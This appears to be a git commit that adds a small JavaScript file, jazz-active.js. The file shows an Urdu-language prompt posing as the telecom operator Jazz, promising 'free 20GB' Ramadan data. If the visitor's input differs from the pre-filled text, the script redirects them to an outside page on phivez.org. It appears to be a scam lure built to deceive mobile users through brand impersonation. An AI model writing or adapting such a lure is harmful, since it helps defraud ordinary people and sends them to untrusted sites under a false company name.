23ab91d7c04ef482d2ba2976aebfa762a023d68b
newblog13 <sweet16guyz@gmail.com>
2026-02-20 17:41:20 +0100

    Create jazz-active.js

---
+++ jazz-active.js
@@ -0,0 +1,5 @@
+var password = '20 جی بی کو چالو کریں۔'
+password=prompt('Jazz: رمضان مبارک، آپ کا 20GB مفت ڈیٹا زیر التواء ہے... ابھی ایکٹیویٹ کرنے کے لیے اوکے پر کلک کریں','20 جی بی کو چالو کریں۔');
+if (password != '20 جی بی کو چالو کریں۔') {
+location.href='https://phivez.org/jazz.html';
+}
